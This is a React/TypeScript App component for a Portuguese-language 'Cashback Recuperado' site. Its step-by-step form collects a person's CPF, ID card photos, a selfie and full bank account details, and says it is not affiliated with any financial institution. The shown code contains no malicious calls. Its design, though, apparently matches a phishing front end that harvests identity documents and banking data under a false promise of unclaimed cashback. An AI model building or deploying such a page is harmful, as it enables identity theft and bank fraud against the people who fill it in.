import React, { useState } from 'react';
import { FormState } from './types';
import StepIndicator from './components/StepIndicator';
import InfoStep from './components/InfoStep';
import UserDataStep from './components/UserDataStep';
import DocumentUploadStep from './components/DocumentUploadStep';
import BankInfoStep from './components/BankInfoStep';
import SuccessStep from './components/SuccessStep';
import { CreditCard } from 'lucide-react';

function App() {
  const [formState, setFormState] = useState<FormState>({
    step: 0,
    userData: {
      cpf: '',
      annualSpending: '',
    },
    documentData: {
      idFront: null,
      idBack: null,
      selfie: null,
    },
    bankData: {
      bankName: '',
      accountType: '',
      agency: '',
      account: '',
      accountDigit: '',
    },
    isSubmitting: false,
    isSuccess: false,
    error: null,
    claimId: null,
  });

  const steps = [
    'Informações',
    'Dados Pessoais',
    'Documentos',
    'Dados Bancários',
    'Confirmação',
  ];

  const updateUserData = (data: Partial<typeof formState.userData>) => {
    setFormState((prev) => ({
      ...prev,
      userData: {
        ...prev.userData,
        ...data,
      },
    }));
  };

  const updateDocumentData = (data: Partial<typeof formState.documentData>) => {
    setFormState((prev) => ({
      ...prev,
      documentData: {
        ...prev.documentData,
        ...data,
      },
    }));
  };

  const updateBankData = (data: Partial<typeof formState.bankData>) => {
    setFormState((prev) => ({
      ...prev,
      bankData: {
        ...prev.bankData,
        ...data,
      },
    }));
  };

  const nextStep = () => {
    setFormState((prev) => ({
      ...prev,
      step: prev.step + 1,
    }));
  };

  const prevStep = () => {
    setFormState((prev) => ({
      ...prev,
      step: prev.step - 1,
    }));
  };

  const setIsSubmitting = (isSubmitting: boolean) => {
    setFormState((prev) => ({
      ...prev,
      isSubmitting,
    }));
  };

  const setError = (error: string | null) => {
    setFormState((prev) => ({
      ...prev,
      error,
    }));
  };

  const completeProcess = (claimId: string) => {
    setFormState((prev) => ({
      ...prev,
      step: steps.length - 1,
      isSuccess: true,
      claimId,
    }));
  };

  const renderStep = () => {
    switch (formState.step) {
      case 0:
        return <InfoStep onNext={nextStep} />;
      case 1:
        return (
          <UserDataStep
            userData={formState.userData}
            onUpdateUserData={updateUserData}
            onNext={nextStep}
            onPrev={prevStep}
          />
        );
      case 2:
        return (
          <DocumentUploadStep
            userData={formState.userData}
            documentData={formState.documentData}
            onUpdateDocumentData={updateDocumentData}
            onNext={nextStep}
            onPrev={prevStep}
            setIsSubmitting={setIsSubmitting}
            setError={setError}
          />
        );
      case 3:
        return (
          <BankInfoStep
            userData={formState.userData}
            bankData={formState.bankData}
            onUpdateBankData={updateBankData}
            onComplete={completeProcess}
            onPrev={prevStep}
            setIsSubmitting={setIsSubmitting}
            setError={setError}
          />
        );
      case 4:
        return <SuccessStep claimId={formState.claimId || 'CB-000000'} />;
      default:
        return <InfoStep onNext={nextStep} />;
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 py-8 px-4">
      <header className="max-w-4xl mx-auto mb-8">
        <div className="flex items-center justify-center">
          <CreditCard className="text-blue-600 mr-2" size={32} />
          <h1 className="text-3xl font-bold text-blue-800">Cashback Recuperado</h1>
        </div>
      </header>

      {formState.step > 0 && (
        <div className="max-w-3xl mx-auto mb-6">
          <StepIndicator currentStep={formState.step} steps={steps} />
        </div>
      )}

      {formState.error && (
        <div className="max-w-3xl mx-auto mb-6 bg-red-50 border-l-4 border-red-500 p-4">
          <div className="flex">
            <div className="ml-3">
              <p className="text-sm text-red-700">{formState.error}</p>
            </div>
          </div>
        </div>
      )}

      {formState.isSubmitting ? (
        <div className="max-w-2xl mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-700 font-medium">Processando sua solicitação...</p>
          <p className="text-gray-500 text-sm mt-2">Isso pode levar alguns instantes.</p>
        </div>
      ) : (
        renderStep()
      )}

      <footer className="max-w-4xl mx-auto mt-12 text-center text-gray-500 text-sm">
        <p>© 2025 Cashback Recuperado. Todos os direitos reservados.</p>
        <p className="mt-1">
          Este é um serviço de recuperação de cashback não resgatado. Não somos afiliados a nenhuma instituição financeira.
        </p>
      </footer>
    </div>
  );
}

export default App;